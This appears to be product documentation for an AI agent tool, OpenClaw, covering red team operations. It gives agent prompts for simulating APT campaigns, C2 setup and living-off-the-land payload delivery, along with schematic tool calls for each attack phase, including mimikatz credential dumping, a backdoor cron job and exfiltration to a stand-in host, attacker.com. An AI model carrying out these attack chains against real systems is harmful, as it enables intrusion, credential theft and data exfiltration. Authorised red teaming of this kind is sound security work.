---
summary: "Red team operations and offensive security workflows with OpenClaw"
read_when:
  - Running red team exercises
  - Simulating advanced persistent threats (APTs)
  - Testing security controls
title: "Red Team Operations"
---

# Red Team Operations with OpenClaw

OpenClaw enables comprehensive red team operations, simulating real-world attack scenarios to test and improve your organization's security posture.

## Overview

Red team operations involve simulating adversary tactics, techniques, and procedures (TTPs) to:

- **Test Security Controls**: Validate detection and response capabilities
- **Identify Gaps**: Find weaknesses in security posture
- **Improve Defenses**: Provide actionable intelligence for blue teams
- **Compliance**: Meet regulatory requirements for security testing
- **Training**: Enhance security team capabilities through realistic scenarios

## Red Team Workflows

### 1. Adversary Simulation

Simulate advanced persistent threats (APTs) and real-world attack scenarios:

```bash
# Simulate Volt Typhoon campaign
openclaw agent --message "Simulate a Volt Typhoon-style attack: pre-positioning on critical infrastructure, living off the land techniques, and long-term persistence"

# Simulate Scattered Spider campaign
openclaw agent --message "Simulate a Scattered Spider attack: social engineering, initial access via compromised credentials, and lateral movement"

# Simulate APT29 campaign
openclaw agent --message "Simulate an APT29 attack: spear-phishing, credential harvesting, and data exfiltration"
```

### 2. Attack Chain Execution

Execute complete attack chains from initial access to data exfiltration:

**Initial Access**

```json
red_team_execute({
  phase: "initial_access",
  technique: "phishing",
  target: "employees@example.com",
  payload: "malicious_document.docx"
})
```

**Execution**

```json
red_team_execute({
  phase: "execution",
  technique: "command_and_scripting_interpreter",
  method: "powershell",
  payload: "encoded_script"
})
```

**Persistence**

```json
red_team_execute({
  phase: "persistence",
  technique: "scheduled_task",
  method: "cron",
  payload: "backdoor.sh"
})
```

**Privilege Escalation**

```json
red_team_execute({
  phase: "privilege_escalation",
  technique: "exploitation_for_privilege_escalation",
  target: "sudo",
  exploit: "CVE-2021-3156"
})
```

**Defense Evasion**

```json
red_team_execute({
  phase: "defense_evasion",
  technique: "process_injection",
  method: "dll_injection",
  target_process: "notepad.exe"
})
```

**Credential Access**

```json
red_team_execute({
  phase: "credential_access",
  technique: "credential_dumping",
  method: "mimikatz",
  target: "lsass.exe"
})
```

**Discovery**

```json
red_team_execute({
  phase: "discovery",
  technique: "system_network_configuration_discovery",
  commands: ["ipconfig", "netstat", "arp"]
})
```

**Lateral Movement**

```json
red_team_execute({
  phase: "lateral_movement",
  technique: "remote_services",
  method: "ssh",
  target: "192.0.2.50",
  credentials: "stolen_creds"
})
```

**Collection**

```json
red_team_execute({
  phase: "collection",
  technique: "data_from_local_system",
  target_files: ["*.docx", "*.xlsx", "*.pdf"],
  location: "/home/user/documents"
})
```

**Exfiltration**

```json
red_team_execute({
  phase: "exfiltration",
  technique: "exfiltration_over_c2_channel",
  method: "https",
  destination: "https://attacker.com/exfil",
  data: "collected_data.zip"
})
```

### 3. Living Off the Land (LOLBAS)

Use legitimate system tools and binaries to evade detection:

```json
# Use Windows LOLBAS
openclaw agent --message "Use living-off-the-land techniques on Windows: use certutil, bitsadmin, and regsvr32 for payload delivery and execution"

# Use Linux LOLBAS
openclaw agent --message "Use living-off-the-land techniques on Linux: use curl, wget, and base64 for payload delivery and execution"
```

### 4. Command & Control (C2) Simulation

Simulate command and control infrastructure:

```bash
# Set up C2 infrastructure
openclaw agent --message "Set up a command and control infrastructure: HTTP C2 server, encrypted communications, and beacon scheduling"

# Deploy C2 agents
openclaw agent --message "Deploy C2 agents to compromised systems with randomized beacon intervals and encrypted communications"
```

## Threat Actor Profiles

OpenClaw includes built-in threat actor profiles based on real-world APTs:

### Volt Typhoon

- **Attribution**: PRC
- **Focus**: Critical infrastructure pre-positioning
- **TTPs**: Living off the land, long-term persistence, minimal malware

### Scattered Spider

- **Attribution**: Cybercriminal group
- **Focus**: Social engineering, credential theft
- **TTPs**: SIM swapping, MFA bypass, cloud compromise

### APT29 (Cozy Bear)

- **Attribution**: Russia
- **Focus**: Government and diplomatic targets
- **TTPs**: Spear-phishing, credential harvesting, data exfiltration

### APT28 (Fancy Bear)

- **Attribution**: Russia
- **Focus**: Government and military targets
- **TTPs**: Spear-phishing, zero-day exploits, custom malware

## Red Team Tools

### Reconnaissance Tools

- Subdomain enumeration (Amass, Subfinder)
- Port scanning (Nmap, Masscan)
- Service detection (Nmap, Nmap scripts)
- OSINT gathering (Shodan, Censys, Google Dorking)

### Exploitation Tools

- Metasploit Framework
- Exploit-DB integration
- Custom exploit development
- Payload generation (MSFVenom, custom)

### Post-Exploitation Tools

- Mimikatz (credential dumping)
- BloodHound (Active Directory mapping)
- PowerSploit (PowerShell post-exploitation)
- LinPEAS (Linux privilege escalation)

### C2 Frameworks

- Cobalt Strike simulation
- Empire/PowerShell Empire
- Custom C2 development

## Reporting

Generate comprehensive red team exercise reports:

```bash
openclaw agent --message "Generate a red team exercise report: include attack timeline, techniques used, security control effectiveness, and recommendations"
```

Report includes:

- Executive summary
- Attack timeline and phases
- MITRE ATT&CK mapping
- Security control effectiveness
- Detection gaps
- Remediation recommendations
- Lessons learned

## Best Practices

1. **Rules of Engagement**: Define clear ROE before starting exercises
2. **Scope Definition**: Clearly define in-scope and out-of-scope systems
3. **Communication**: Maintain open communication with blue team
4. **Documentation**: Document all activities, techniques, and findings
5. **Safety**: Ensure no impact on production systems or data
6. **Debriefing**: Conduct post-exercise debriefing with all stakeholders

## Integration with Blue Team

Red team operations should integrate with blue team for maximum value:

- **Purple Team Exercises**: Collaborative red/blue team exercises
- **Threat Intelligence Sharing**: Share TTPs and IOCs with blue team
- **Detection Validation**: Test and improve detection capabilities
- **Incident Response**: Validate incident response procedures

## Related Documentation

- [Penetration Testing](/security/pen-testing)
- [Blue Team Operations](/security/blue-team)
- [Threat Intelligence](/cybersecurity/threat-intelligence)
- [Security Audit](/cli/security)
